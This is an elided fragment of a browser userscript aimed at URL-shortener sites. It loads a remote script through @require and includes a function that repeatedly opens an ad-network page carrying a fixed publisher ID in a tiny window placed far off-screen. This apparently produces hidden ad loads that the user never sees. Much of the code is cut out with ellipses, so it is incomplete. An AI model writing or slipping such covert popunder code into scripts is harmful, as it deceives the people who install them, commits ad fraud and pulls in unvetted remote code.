...
// @require     http://userscripts.org/scripts/source/160724.user.js
// @include     *://*.*cks.com/
// @include     *://*cl.my/*
// @include     *://*link.com/*
// @include     *://*df.ly/*
...
if(wparent.location.href.indexOf('m/v/?vl=') != -1 && top==self){
	...
	//http://yllix.com/fullpage.php?pub=333142&section=General&ga=g
	...
	function rec(ctr){
		...
		if(arr[ctr]){
			...
			wparent.open("http://yllix.com/fullpage.php?pub=333142&section=General&ga=g","","width=100,height=100,top=1000,left=20000") ;
		}	
	}
	rec(ctr);
